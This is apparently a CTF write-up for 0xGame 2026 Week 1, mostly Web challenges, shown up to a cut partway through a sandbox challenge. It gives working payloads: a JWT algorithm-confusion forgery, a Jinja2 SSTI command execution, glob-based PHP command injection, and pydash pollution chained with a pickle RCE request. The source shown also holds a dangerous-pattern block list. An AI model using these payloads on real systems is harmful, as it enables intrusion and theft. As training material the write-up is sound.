# [[个人队伍] 0xGame2026的Writeup]()

> **2026年09月28日09:00 ~ 2026年10月25日21:00**
>
> **比赛地址：https://0xgame2026.play.ctfplus.cn/**
>
> **复现地址：https://0xgame2026.play.ctfplus.cn/**

> ## **比赛介绍**
>
> 0xGame 2026 是由南京邮电大学 X1cT34m 战队举办的, 面向校内外大一新生的 CTF 竞赛. 本次线上比赛为期两周，另设线下决赛环节, 题目类型设有 Web, Reverse, Pwn, Crypto, Misc, Osint, AI 七大方向, 赛题难度友好, 适合对网络安全和 CTF 感兴趣的零基础同学参与. 通过本次比赛, 你将会学习到网络安全的基本知识, 探索 CTF 的各个方向, 培养自主学习的能力, 提升自己的技术水平. 比赛成绩优异者将有机会获得 X1cT34m 战队的优先招新资格.
>
> 关于 X1cT34m: [https://ctf.njupt.edu.cn](https://ctf.njupt.edu.cn/)
>
> 本次比赛由[CTF+平台](https://www.ctfplus.cn/)全力支持
>
> ## **比赛时间**
>
> 2026 年 9 月 28 日 - 2026 年 10 月 25 日
>
> - Week 1: 9.28 - 10.4
> - Week 2: 10.5 - 10.11
> - Final: 10.24
>
> 线上赛每周第一天上午 9:00 开始, 最后一天晚上 21:00 结束
> 0xGame Final: 10:00 - 16:00
>
> ## **比赛规则**
>
> 1. 线上比赛时间为 `2026 年 9 月 28 日 - 2026 年 10 月 11 日`, 一共持续两周, 期间均可注册报名参赛. 第二周开始时, 平台会放出各个方向的新题, 同时前一周的题目将关闭 Flag 提交
> 2. 比赛形式为个人赛
> 3. 线上比赛分校内新生赛道和非校内新生赛道，校内新生选手注册后报名比赛时需填写自己的姓名、学号, 以便后续证书和奖金的发放 (仅南邮本科大一新生可获得证书和奖金，校内大二以上学生请选择非校内新生赛道)
> 4. 线上比赛校外选手不可以校内新生身份报名, **校外选手若出现蓄意选择校内新生赛道并扰乱比赛平衡的, 将直接做禁赛处理**
> 5. 比赛的 Flag 格式为 `0xGame{...}`
> 6. 比赛采用动态积分制, 题目初始分数为 1000 分, 分值随解题人数的增加而递减, 最低分数为 200 分, 无前三血加成
> 7. 请自觉遵守比赛相关规则, 严禁对比赛平台和题目环境造成破坏 (包括但不限于修改 Flag、 题目本身代码等导致其它选手无法正常解题), 严禁多人组队参赛或多人共用同一账号, 严禁互相交流 Flag 或解题思路, 严禁在当周比赛结束前提前在互联网上公布 Writeup, **一经发现将直接做禁赛处理**
> 8. 校内新生选手如果想获得奖项, 需在每周结束前将这一周的 Writeup (解题报告, 格式为 PDF) 发送至邮箱 `0xgame@x1ct34m.com`, 邮件标题为 `新生 学号 姓名 平台账号 0xGame 2026 Week N Writeup`, 例如 `新生 B26010101 Name Plat_Name 0xGame 2026 Week 1 Writeup`
> 9. 本次比赛不设置校外奖项, 但我们会在校外提交的 Writeup 中选出一些有新意的人工 Writeup, 并抽取几位送出周边小礼品~
> 10. 更多信息请关注平台公告和 0xGame 2026 QQ大群 (746958713), 若对比赛题目有任何疑问, 可直接联系 QQ 群管理员; 校内新生请加校内新生群 (1106371243)
> 11. 比赛赛题和规则等相关内容的最终解释权归 X1cT34m 所有
>
> ## **奖项**
>
> ### **校内新生**
>
>  **一等奖x3** 800元+证书+奖杯+周边+5个自主个性化学分（奖杯分冠军, 亚军, 季军）
>
>  **二等奖x5** 600元+证书+周边+4个自主个性化学分
>
>  **三等奖x7** 400元+证书+贴纸+3个自主个性化学分
>
>  **单方向优异奖**：100元
>
>  **一血数量奖**：100元+奖牌（仅在决赛颁发，单方向任意题取得一血）
>
>  另设 **Girl Prize xN** 100元（新生前30名中的女生）
>
> ## **关于比赛中大模型的使用**
>
> 对于校内新生，本场比赛参照 `XSWCTF AI 协助分级规则`，采取 A1 级别限制：允许 AI 用于资料查询、概念解释、一般性咨询，禁止使用具备 Agent 能力的 AI 工具进行托管式、自动化或半自动化解题;
>
> 对于非校内新生, 我们不建议完全使用 Agent 进行解题. 如果你的 Agent 攻击比赛平台或进行其他非法操作，账号将被封禁; 同时, 我们将结合平台操作日志、解题时间线、Writeup 等内容综合判定, 保留对疑似使用 Agent 自动化做题且排名靠前的选手进行 隐藏排名处理 的权利; 被判定选手可通过提交正确的人工做题 Writeup 进行申诉.
>
> ### **XSWCTF AI 协助分级规则**



# Week1



## All



### 欢迎来到CTF的世界！

#### 题目介绍

> - 已解出 249
>
>   ATP代码实验
>
>   
>
> - 已解出 299
>
>   错位的签名
>
>   
>
> - 已解出 453
>
>   pollute the key
>
>   
>
> - 已解出 237
>
>   奶蛙的博客
>
>   
>
> - 已解出 214
>
>   欢迎来到CTF的世界！
>
>   
>
> - 已解出 387
>
>   一切的开始
>
>   
>
> ## 入门
>
> 作者 X1cT34m 
>
> 240 队已解出本题
>
> # 欢迎来到CTF的世界！
>
> - 214分
> - 无动态环境
> - Misc
> - Web
> - Crypto
> - Pwn
> - Reverse
> - 入门
>
> ### 对CTF还不是很了解的同学们，认真看看这篇入门指北，并提交你的第一个flag吧！

---

#### 解题过程

##### 1. 查看文档

```shell
为了奖励你的认真观看，这⾥有⼀串神秘字符送给你：
MHhHYW1le3dlbGNvbWVfdDBfdGhlX3cwcmxkX29mX0NURiF9
这是什么呢？学会使⽤搜索引擎和AI吧！
```

##### 2. Base64解码

```shell
MHhHYW1le3dlbGNvbWVfdDBfdGhlX3cwcmxkX29mX0NURiF9 # 0xGame{welcome_t0_the_w0rld_of_CTF!}
```

#### 题目答案

##### Flag

```flag
0xGame{welcome_t0_the_w0rld_of_CTF!}
```



## Web



### 错位的签名

#### 题目介绍

> 作者 inex 
>
> 47 队已解出本题
>
> # 错位的签名
>
> - 372分
> - 动态环境
> - Web
> - 简单
>
> ## 
>
> 1. 提示 1
>
>    这是个Apache APISIX的有关jwt的CVE
>
> 一个普通的jwt验证系统......但似乎配置有些问题？

---

#### 解题过程

##### 1. 弱口令爆破密码

```shell
Username：guest
Password：guest123
```

##### 2. 信息搜集

`admin公钥`

```shell
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA79XYBopfnVMKxI533oU2
VFQbEdSPtWRD+xSl73lHLVboGP1lSIZtnEj5AcTN2uDW6AYPiWL2iA3lEEsDTs7J
BUXyl6pysBPfrqC8n/MOXKaD4e8U5GAHFiwHWg2WzHlfFSlFkLjzp0vPkDK+fQ4C
lrd7shAyitB7use6DHcVCKuI4bFOoFbdI5sBGeyoD833g+ql9bRkH/vf8O+rPwHA
M+47r1iv3lY3ex0P45PRd7U7rq8P8UIw6qOI1tiYuKlFJmjFdcwtYG0dctxWwgL1
+7njrVQoWvuOTSsc9TDMhZkmmSsU3wXjaPxJpydck1C/w9ZLqsctKK5swYWhIcbc
BQIDAQAB
-----END PUBLIC KEY-----
```

##### 3. CVE查找

```shell
网关版本：Apache APISIX 3.16.0
这是一个已知受影响的历史版本。
方向提示：漏洞和 JWT 有关。
年份提示：看一看 2026 年修复的 JWT 相关 CVE。
再想一想：如果一个系统既信公钥，又信 token 头里的 alg，会发生什么？
```

```shell
## CVE-2026-39999（重点，JWT 算法混淆，认证绕过）

- **CVSS**：9.1（高危，部分分析为 9.8）
- **组件**：`jwt-auth` 插件
- **影响版本**：Apache APISIX 2.2 ~ 3.16.0
- **漏洞原理**：经典 JWT 算法混淆攻击。Consumer 配置**非对称算法（RS256/ES256 等）+ 公钥**时，攻击者构造 header `alg:HS256`，使用该公钥作为 HMAC 密钥签名 JWT，**可伪造任意用户身份，完全绕过 JWT 鉴权**
- **修复版本**：3.16.1 / 3.17.0
- **触发条件**：使用非对称密钥（RSA/EC）配置 jwt-auth；仅对称密钥 HS256 场景不受该漏洞影响
```

##### 4. JWT更改

```shell
https://www.jwt.io/
```

```shell
http://9080-87b240b5-87e1-4a2e-b018-793041c07df4.challenge.ctfplus.cn/flag?jwt=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJndWVzdCIsInJvbGUiOiJndWVzdCIsInN1YiI6Imd1ZXN0IiwiZXhwIjoxNzkwNTgzODY1LCJuYmYiOjE3OTA1ODAyMDV9.uV7KXgNR7S6Ke2nwmjh3AreoXUULKY9X9A6kwLPb3SRHtxLweu-YoQjzZ3lXdGO1ljoQnnLie9pbhgoC42nt6d05Z2DzoMBsIoNKCbr4bCswHY928Lrj0kkMJ8l9e1qheLj98yKVLKgITDg_vNQBwzXPX5rhr9r4F6rj8Chaex_mnexHuw8bTJjX5efEbSllOFAXHu54CbL8WfNeWoz7r2zASAK_tsecjRZ8ks-P5KxTh4dAIJkN5F4EGsd78INr_W_uHh1E8f6-as4idORVdN-_WTN3t7oWv7cwS3HfD33guNM6GGAcm0OLOsZUk3PM4wqV55wFNsV7-PxubzYJHA
```

```shell
{
  "alg": "RS256", # 这个改成 HS256
  "typ": "JWT"
}
```

```shell
{
  "key": "guest", # 这里改成 admin
  "role": "guest", # 这里改成 admin
  "sub": "guest", # 这里改成 admin
  "exp": 1790583865,
  "nbf": 1790580205
}
```

Secret-Key 用 Public-Key 即上面的 admin 公钥

得到新的JWT

```shell
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsInN1YiI6ImFkbWluIiwiZXhwIjoxNzkwNTgzODY1LCJuYmYiOjE3OTA1ODAyMDV9.jdqcJ6SrnK7CrlEJf1vyCY9ANTpg50SnngiqwpFwjPY
```

##### 5. 发起攻击

```shell
http://9080-87b240b5-87e1-4a2e-b018-793041c07df4.challenge.ctfplus.cn/flag?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsInN1YiI6ImFkbWluIiwiZXhwIjoxNzkwNTgzODY1LCJuYmYiOjE3OTA1ODAyMDV9.jdqcJ6SrnK7CrlEJf1vyCY9ANTpg50SnngiqwpFwjPY
```

```shell
0xGame{455670c9-2315-4e0f-8e5b-a9de26ffc2b8}
```

---

#### 题目答案

##### payload

```payload
/flag?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsInN1YiI6ImFkbWluIiwiZXhwIjoxNzkwNTgzODY1LCJuYmYiOjE3OTA1ODAyMDV9.jdqcJ6SrnK7CrlEJf1vyCY9ANTpg50SnngiqwpFwjPY
```

##### Flag

```flag
0xGame{455670c9-2315-4e0f-8e5b-a9de26ffc2b8}
```



### 渲染如呼吸一样简单

#### 题目介绍

> 作者 inex 
>
> 61 队已解出本题
>
> # 渲染如呼吸一样简单
>
> - 494分
> - 动态环境
> - Web
> - 简单
>
> 这是给运营同学临时预览模板片段用的调试页，你能找到通往get shell的大门吗？

---

#### 解题过程

##### 1. 查看题目

```html
<h2>Hello, {{ profile.name }}</h2>
<p>{{ motd }}</p>
```

```shell
Hello, guest
Preview service online. Keep templates short and readable.
```

**分析**

- Flask的SSTI模板注入

  我们这里用`<class 'os._wrap_close'>`

- 注意区分XXE实体注入

##### 2. 编写Payload

```html
{{().__class__.__base__.__subclasses__()[155].__init__.__globals__.popen("env").read()}}
```

```shell
KUBERNETES_PORT=1449 KUBERNETES_SERVICE_PORT=449 HOSTNAME=dep-5ec62236-b5a4-4e6b-972b-45c6a0e7a7e3-d5c88d8c5-s8b7v HOME=/home/ctf GPG_KEY=7169605F62C751356D054A26A821E680E5FA6305 PYTHON_SHA256=5c8462af5790baf43a321a1559dbe0db06d1be4300fb85fb53c40060668e548a WERKZEUG_SERVER_FD=3 KUBERNETES_PORT_443_TCP_ADDR=unix:///var/run/docker.sock PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin KUBERNETES_PORT_443_TCP_PORT=1449 KUBERNETES_PORT_443_TCP_PROTO= LANG=C.UTF-8 PYTHON_VERSION=3.12.14 KUBERNETES_PORT_443_TCP= KUBERNETES_SERVICE_PORT_HTTPS=449 KUBERNETES_SERVICE_HOST=unix:///var/run/docker.sock PWD=/app FLAG=0xGame{f24c6a0c-704d-49e3-a64c-0d215d945792}
```

---

#### 题目答案

##### Payload

```payload
{{().__class__.__base__.__subclasses__()[155].__init__.__globals__.popen("env").read()}}
```

##### Flag

```flag
0xGame{f24c6a0c-704d-49e3-a64c-0d215d945792}
```

---

#### 漏洞成因

基于Flask框架的Jinja2模板引擎开发，核心问题为**直接将用户可控变量传入模板动态渲染，未做任何过滤与转义**。

---

#### 修复建议

修改业务逻辑，**禁止将用户输入、外部可控参数直接传入Jinja2动态模板解析**。



### 一切的开始

#### 题目介绍

> 作者 inex 
>
> 45 队已解出本题
>
> # 一切的开始
>
> - 584分
> - 动态环境
> - Web
> - 简单
>
> 让我康康你的工具安装正不正常（不正常请call inex）

---

#### 解题过程

##### 1. 扫描题目

```shell
python dirsearch.py -u http://5000-9016c453-9f2e-401a-baf5-773e72b119d3.challenge.ctfplus.cn/ -e *
```

```shell
[17:51:29] 301 -   48B  - /debug/pprof  ->  /debug/pprof/
[17:51:29] 200 -   10KB - /debug/pprof/goroutine?debug=1
[17:51:29] 200 -    2KB - /debug/pprof/
[17:51:29] 200 -   57KB - /debug/pprof/heap
[17:51:30] 200 -   67KB - /debug/pprof/trace
[17:51:39] 200 -   65B  - /health
[17:51:56] 200 -  128B  - /metrics
[17:52:08] 200 -   55B  - /robots.txt
```

##### 2. 查看题目

```shell
/robots.txt
```

```shell
User-agent: *
Disallow: /inex233
# 访问inex233页面
```

```shell
/inex233
```

```shell
请get传参aaa=flag
```

```shell
/inex233?aaa=flag
```

```shell
请post传参bbb=flag
```

```shell
/inex233?aaa=flag
POST bbb=flag
```

```shell
要带上sweet的小饼干
```

```shell
/inex233?aaa=flag
POST
Cookie: sweet=sweet
bbb=flag
```

```shell
你必须来自127.0.0.1
```

```shell
/inex233?aaa=flag
POST
Cookie: sweet=sweet
X-Forwarded-For: 127.0.0.1
bbb=flag
```

```shell
你必须来自127.0.0.1
```

**分析**

- 这里我尝试了各种参数都过不了，甚至连AI(豆包-工作任务)都找不到正确的参数
- 最后在AI(Trae-CN)的帮助下找到了正确的参数`Referer: http://127.0.0.1`

```shell
/inex233?aaa=flag
POST
Cookie: sweet=sweet
Referer: http://127.0.0.1
bbb=flag
```

```shell
请json传参web：flag
```

```shell
/inex233?aaa=flag
POST
Cookie: sweet=sweet
Referer: http://127.0.0.1
{"bbb": "flag","web": "flag"}
```

```shell
0xGame{7c9f515a-795f-4fbb-8f87-037d253ae0ac}
```

---

#### 题目答案

##### Payload

```payload
/inex233?aaa=flag
POST
Cookie: sweet=sweet
Referer: http://127.0.0.1
{"bbb": "flag","web": "flag"}
```

##### Flag

```flag
0xGame{7c9f515a-795f-4fbb-8f87-037d253ae0ac}
```



### ez_64

#### 题目介绍

> 作者 inex 
>
> 94 队已解出本题
>
> # ez_64
>
> - 369分
> - 动态环境
> - Web
> - 简单
>
> 64是什么，能吃吗？

---

#### 解题过程

##### 1. 查看源码

```php
<?php
chdir(__DIR__);

if (isset($_GET['c'])) {
    $c = $_GET['c'];
    if (preg_match("#^[/?. fla64]*$#", $c)) {
        system($c);
    } else {
        die("no no no!");
    }
} else {
    highlight_file(__FILE__);
}
```

**分析**

- 只允许`/ ? . 空格 f l a 6 4`存在
- 我们可以用`glob`通配

##### 2. 编写Payload

###### I. 预期解

`/bin/base64 ./flag.php`

```shell
?c=/???/?a??64 ./fla?.???
```

```shell
PD9waHAKJGZsYWcgPSAnMHhHYW1lezgxZGI3ZDUwLWRkOTEtNDMyYy05ZDk0LTEwMDViYjRmMzMz Mn0nOwo/Pgo=
```

```php
<?php
$flag = '0xGame{81db7d50-dd91-432c-9d94-1005bb4f3332}';
?>
```

###### II. 非预期解

`/bin/cat ./flag.php`

```shell
?c=/???/?a? ./fla?.???
```

在`network`的`response`找到

```shell
$flag = '0xGame{81db7d50-dd91-432c-9d94-1005bb4f3332}'
```

#### 题目答案

##### Payload

```payload
?c=/???/?a??64 ./fla?.???

?c=/???/?a? ./fla?.???
```

##### Flag

```flag
0xGame{81db7d50-dd91-432c-9d94-1005bb4f3332}
```



### pollute the key

#### 题目介绍

> 作者 inex 
>
> 42 队已解出本题
>
> # pollute the key
>
> - 603分
> - 动态环境
> - Web
> - 中等
>
> 老大你的key有点发紫啊，确定不修修吗？🥲

---

#### 解题过程

##### 1. 查看源码

```python
import base64
import hashlib
import hmac
import json
import os
import pickle
import random
import threading
import time

import pydash
from flask import (
    Flask,
    jsonify,
    make_response,
    redirect,
    render_template,
    request,
    send_from_directory,
    url_for,
)

from runtime_secrets import SECRET_KEY, rotate_flag

app = Flask(__name__, static_folder=None)

STATIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "static")


@app.route("/static/<path:filename>", endpoint="static")
def static_files(filename, _dir=STATIC_DIR):
    return send_from_directory(_dir, filename)


JWT_ALG = "HS256"
JWT_TTL = 7200


def _secret() -> str: # 这个是 Secret-Key
    return SECRET_KEY


def hash_password(password: str, salt: str) -> str:
    return hashlib.sha256(("%s:%s" % (salt, password)).encode()).hexdigest()


def _b64e(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def _b64d(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def jwt_encode(payload: dict) -> str:
    header = {"alg": JWT_ALG, "typ": "JWT"}
    segs = [
        _b64e(json.dumps(header, separators=(",", ":")).encode()),
        _b64e(json.dumps(payload, separators=(",", ":")).encode()),
    ]
    signing_input = ".".join(segs).encode()
    sig = hmac.new(_secret().encode(), signing_input, hashlib.sha256).digest()
    segs.append(_b64e(sig))
    return ".".join(segs)


def jwt_decode(token: str):
    try:
        h, p, s = token.split(".")
        if json.loads(_b64d(h)).get("alg") != JWT_ALG:
            return None
        expected = _b64e(
            hmac.new(
                _secret().encode(), ("%s.%s" % (h, p)).encode(), hashlib.sha256
            ).digest()
        )
        if not hmac.compare_digest(expected, s):
            return None
        payload = json.loads(_b64d(p))
        if int(payload.get("exp", 0)) < time.time():
            return None
        return payload
    except Exception:
        return None


def current_user():
    token = request.cookies.get("token")
    return jwt_decode(token) if token else None


class User:
    def __init__(
        self, username, password, role="user", email="", phone="", nickname=""
    ):
        self.username = username
        self.salt = os.urandom(16).hex()
        self.password = hash_password(password, self.salt)
        self.role = role
        self.email = email
        self.phone = phone
        self.nickname = nickname

    def profile(self):
        return {
            "username": self.username,
            "role": self.role,
            "email": self.email,
            "phone": self.phone,
            "nickname": self.nickname,
        }


USERS_LOCK = threading.Lock()
ORDERS = []

PRODUCTS = [
    {"id": "p1001", "name": "旗舰版机械键盘", "price": 899.00, "icon": "⌨️"},
    {"id": "p1002", "name": "4K 显示器 27寸", "price": 1899.00, "icon": "🖥️"},
    {"id": "p1003", "name": "人体工学椅", "price": 2499.00, "icon": "🪑"},
    {"id": "p1004", "name": "降噪耳机 Pro", "price": 1299.00, "icon": "🎧"},
    {"id": "p1005", "name": "便携固态硬盘 2TB", "price": 699.00, "icon": "💾"},
    {"id": "p1006", "name": "机械臂咖啡机", "price": 3699.00, "icon": "☕"},
]


@app.route("/")
def index():
    return render_template("index.html", user=current_user(), products=PRODUCTS[:3])


@app.route("/shop")
def shop():
    user = current_user()
    is_admin = bool(user) and user.get("role") == "admin"
    demo_cart = ""
    if is_admin:
        demo_cart = base64.b64encode(
            pickle.dumps([p["id"] for p in PRODUCTS[:2]], protocol=0)
        ).decode()
    return render_template(
        "shop.html",
        user=user,
        products=PRODUCTS,
        is_admin=is_admin,
        demo_cart=demo_cart,
    )


@app.route("/login")
def login_page():
    if current_user():
        return redirect(url_for("profile"))
    return render_template("login.html", user=None)


@app.route("/register")
def register_page():
    if current_user():
        return redirect(url_for("profile"))
    return render_template("register.html", user=None)


@app.route("/profile")
def profile():
    user = current_user()
    if not user:
        return redirect(url_for("login_page"))
    record = USERS.get(user.get("username"))
    return render_template(
        "profile.html",
        user=user,
        is_admin=(user.get("role") == "admin"),
        record=record.profile() if record else {},
    )


@app.route("/logout")
def logout():
    resp = make_response(redirect(url_for("index")))
    resp.delete_cookie("token")
    return resp


@app.route("/api/register", methods=["POST"])
def api_register():
    data = request.get_json(silent=True) or {}
    username = (data.get("username") or "").strip()
    password = data.get("password") or ""
    email = (data.get("email") or "").strip()

    if not (3 <= len(username) <= 32) or len(password) < 6:
        return jsonify({"ok": False, "msg": "用户名 3-32 位，密码至少 6 位"}), 400

    with USERS_LOCK:
        if username in USERS:
            return jsonify({"ok": False, "msg": "用户名已被注册"}), 409

        USERS[username] = User(username, password, role="user", email=email)
    return jsonify({"ok": True, "msg": "注册成功，请登录"})


@app.route("/api/login", methods=["POST"])
def api_login():
    data = request.get_json(silent=True) or {}
    username = (data.get("username") or "").strip()
    user = USERS.get(username)
    if not user or user.password != hash_password(
        data.get("password") or "", user.salt
    ):
        return jsonify({"ok": False, "msg": "用户名或密码错误"}), 401

    now = int(time.time())
    payload = {
        "username": user.username,
        "role": user.role,
        "iat": now,
        "exp": now + JWT_TTL,
    }
    resp = make_response(
        jsonify({"ok": True, "msg": "登录成功", "redirect": "/profile"})
    )
    resp.set_cookie(
        "token", jwt_encode(payload), httponly=True, samesite="Lax", max_age=JWT_TTL
    )
    return resp


@app.route("/api/user/update", methods=["POST"]) # 污染全局变量
def api_user_update():
    payload = current_user()
    if not payload:
        return jsonify({"ok": False, "msg": "请先登录"}), 401

    me = USERS.get(payload.get("username"))
    if not me:
        return jsonify({"ok": False, "msg": "用户不存在"}), 401

    data = request.get_json(silent=True) or {}
    key = data.get("key")
    value = data.get("value")
    if not isinstance(key, str) or not key:
        return jsonify({"ok": False, "msg": "参数错误"}), 400

    if "__builtins__" in key:
        return jsonify({"ok": False, "msg": "字段路径非法: 该路径被禁止修改"}), 400

    username, role = me.username, me.role
    try:
        pydash.set_(me, key, value) # 看这里，在这里
    except Exception as e:
        return jsonify({"ok": False, "msg": "字段路径非法: %s" % e}), 400

    me.username, me.role = username, role

    now = int(time.time())
    resp = make_response(
        jsonify({"ok": True, "msg": "资料已更新", "profile": me.profile()})
    )
    resp.set_cookie(
        "token",
        jwt_encode(
            {"username": me.username, "role": me.role, "iat": now, "exp": now + JWT_TTL}
        ),
        httponly=True,
        samesite="Lax",
        max_age=JWT_TTL,
    )
    return resp


@app.route("/api/order/buy", methods=["POST"]) # Pickle 反序列化漏洞
def api_order_buy():
    payload = current_user()
    if not payload:
        return jsonify({"ok": False, "msg": "请先登录"}), 401
    if payload.get("role") != "admin":
        return jsonify({"ok": False, "msg": "下单结算仅对管理员（admin）开放"}), 403

    raw = request.form.get("cart") or ""
    if not raw:
        return jsonify({"ok": False, "msg": "缺少 cart 参数"}), 400
    try:
        cart = pickle.loads(base64.b64decode(raw)) # 看这里，在这里
    except Exception as e:
        return jsonify({"ok": False, "msg": "购物车数据无法解析: %s" % e}), 400

    if not isinstance(cart, list):
        return jsonify({"ok": False, "msg": "购物车格式错误"}), 400

    by_id = {p["id"]: p for p in PRODUCTS}
    items, total = [], 0.0
    for pid in cart:
        p = by_id.get(pid)
        if p:
            items.append(p)
            total += p["price"]
    if not items:
        return jsonify({"ok": False, "msg": "购物车里没有有效商品"}), 400

    order = {
        "order_id": "SO%d" % random.randint(10**8, 10**9 - 1),
        "username": payload.get("username"),
        "items": [i["name"] for i in items],
        "total": round(total, 2),
        "ts": int(time.time()),
    }
    ORDERS.append(order)
    return jsonify({"ok": True, "msg": "下单成功", "order": order})


@app.route("/api/order/list")
def api_order_list():
    payload = current_user()
    if not payload:
        return jsonify({"ok": False, "msg": "请先登录"}), 401
    if payload.get("role") != "admin":
        return jsonify({"ok": False, "msg": "无权限"}), 403
    return jsonify({"ok": True, "orders": ORDERS[-20:]})


if __name__ == "__main__":
    print("=" * 62)
    print(" SimpleShop - 商城靶机")
    print(" Flask + pydash %s" % pydash.__version__)
    print("=" * 62, flush=True)
    threading.Thread(target=rotate_flag, daemon=True).start()
    app.run(host="0.0.0.0", port=5000, threaded=True)
```

**分析**

- 这题的重点我觉得其实在代码审计和漏洞定位

- `/api/user/update`只`waf`了`__builtins__`

  ```python
  pydash.set_(me, key, value)
  ```

  我们可以用它来污染全局变量，比如`SECRET_KEY`

  这样我们就可以伪造`JWT`了

- `/api/order/buy`

  ```python
  cart = pickle.loads(base64.b64decode(raw))
  ```

  这里存在`pickle`反序列化漏洞

  我们可以用它来执行command

##### 2. 具体操作

###### I. 污染SECRET_KEY

```shell
key: __class__.__init__.__globals__.SECRET_KEY
value: probie
```

###### II. 伪造JWT

```shell
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InByb2JpZSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzkwNjAyNzU2LCJleHAiOjE3OTA2MDk5NTZ9.6Z7XYlBgck3NQu5Wzk35J7t6ti6AHau8e6Dp5k2Nhx8

{
  "alg": "HS256",
  "typ": "JWT"
}

{
  "username": "probie",
  "role": "user",
  "iat": 1790602756,
  "exp": 1790609956
}

Secret-Key: unknow
```

```shell
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InByb2JpZSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MDYwMjc1NiwiZXhwIjoxNzkwNjA5OTU2fQ.n0HtFfoo43qtTEctniCKtsNJzoCRqoiK-hiIC8DSCKc

{
  "alg": "HS256",
  "typ": "JWT"
}

{
  "username": "probie",
  "role": "admin",
  "iat": 1790602568,
  "exp": 1790609768
}

Secret-Key: probie
```

###### III. Pickle序列化Payload

```python
import pickle, base64

class R:
    def __reduce__(self):
        return eval, ('__import__("os").popen("cat /flag* > static/pwn.txt").read()',)

print(base64.b64encode(pickle.dumps(R())).decode())
```

```shell
gASVVQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIw5X19pbXBvcnRfXygib3MiKS5wb3BlbigiY2F0IC9mbGFnKiA+IHN0YXRpYy9mbGFnIikucmVhZCgplIWUUpQu
```

**注意**

- 这里Payload的`+`在发送时要改成%2B，以防自动url编码成了空格

##### 3. 发起攻击

```shell
POST /api/order/buy HTTP/1.1
Host: 5000-fc216248-61d6-4f19-9bae-3009fde0de4a.challenge.ctfplus.cn
Content-Length: 49
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Accept: */*
Origin: http://5000-fc216248-61d6-4f19-9bae-3009fde0de4a.challenge.ctfplus.cn
Referer: http://5000-fc216248-61d6-4f19-9bae-3009fde0de4a.challenge.ctfplus.cn/shop
Accept-Encoding: gzip, deflate, br
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InByb2JpZSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MDYwMjc1NiwiZXhwIjoxNzkwNjA5OTU2fQ.n0HtFfoo43qtTEctniCKtsNJzoCRqoiK-hiIC8DSCKc
Connection: keep-alive

cart=gASVVQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIw5X19pbXBvcnRfXygib3MiKS5wb3BlbigiY2F0IC9mbGFnKiA%2BIHN0YXRpYy9mbGFnIikucmVhZCgplIWUUpQu
```

```shell
/static/flag
```

```shell
0xGame{17531687-d17e-439d-931b-61ddd0b0448b}
```

---

#### 题目答案

##### Payload

```payload
POST /api/order/buy HTTP/1.1
Host: 5000-fc216248-61d6-4f19-9bae-3009fde0de4a.challenge.ctfplus.cn
Content-Length: 49
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Accept: */*
Origin: http://5000-fc216248-61d6-4f19-9bae-3009fde0de4a.challenge.ctfplus.cn
Referer: http://5000-fc216248-61d6-4f19-9bae-3009fde0de4a.challenge.ctfplus.cn/shop
Accept-Encoding: gzip, deflate, br
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InByb2JpZSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MDYwMjc1NiwiZXhwIjoxNzkwNjA5OTU2fQ.n0HtFfoo43qtTEctniCKtsNJzoCRqoiK-hiIC8DSCKc
Connection: keep-alive

cart=gASVVQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIw5X19pbXBvcnRfXygib3MiKS5wb3BlbigiY2F0IC9mbGFnKiA%2BIHN0YXRpYy9mbGFnIikucmVhZCgplIWUUpQu
```

##### Flag

```flag
0xGame{17531687-d17e-439d-931b-61ddd0b0448b}
```



### 漏风的沙箱

#### 题目介绍

> 作者 inex 
>
> 50 队已解出本题
>
> # 漏风的沙箱
>
> - 553分
> - 动态环境
> - Web
> - 简单
>
> 相信我，这个沙箱绝对绝对安全......个鬼啊！

---

#### 解题过程

##### 1. 查看源码

```python
import ast
import builtins
import io
import os
import re
import threading
import traceback
import unicodedata
from contextlib import redirect_stdout

from flask import Flask, jsonify, render_template, request

app = Flask(__name__)

SANDBOX_TIMEOUT = int(os.environ.get('SANDBOX_TIMEOUT', '5'))
MAX_CODE_LEN = 5000
MAX_OUTPUT_LEN = 100000
PORT = int(os.environ.get('PORT', '18085'))

dangerous_patterns = [
    r'\bos\.system\b',
    r'\bos\.popen\b',
    r'\bos\.spawn\b',
    r'\bos\.exec\b',
    r'\bos\.fork\b',
    r'\bsubprocess\b',
